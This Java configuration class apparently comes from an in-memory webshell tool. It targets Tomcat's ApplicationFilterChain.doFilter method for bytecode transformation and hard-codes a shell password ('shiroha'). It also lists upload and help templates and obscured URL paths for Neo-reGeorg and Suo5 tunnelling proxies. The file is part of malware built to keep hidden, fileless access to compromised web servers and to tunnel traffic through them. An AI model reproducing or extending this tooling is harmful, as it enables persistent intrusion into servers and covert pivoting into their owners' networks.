package com.stdout.Config;

public class DefaultConfig {
    public static class SpringMemShellConfig {
        public static final String TransformedClassName = "org.apache.catalina.core.ApplicationFilterChain";
        public static final String TransformedMethodName = "doFilter";
        public static String MemShellPassword = "shiroha";
    }

    public static class SpringMemTransformerConfig {
        public static final String TransformedClassName = SpringMemShellConfig.TransformedClassName;
        public static final String TransformedEqualName = SpringMemShellConfig.TransformedClassName.replace(".", "/");
        public static final String TransformedMethodName = SpringMemShellConfig.TransformedMethodName;
    }

    public static class TemplatesConfig {
        public static final String Help = "templates/help.html";
        public static final String Upload = "templates/upload.html";
        public static final String StartTransformer = "start.txt";
        public static final String EndTransformer = "ends.txt";
    }

    public static class ProxyConfig {
        public static final String NeoProxy = "/eGluZ3hpbmcK";
        public static final String Suo5Proxy = "/VTNWdk5Rbz0K";
    }
}
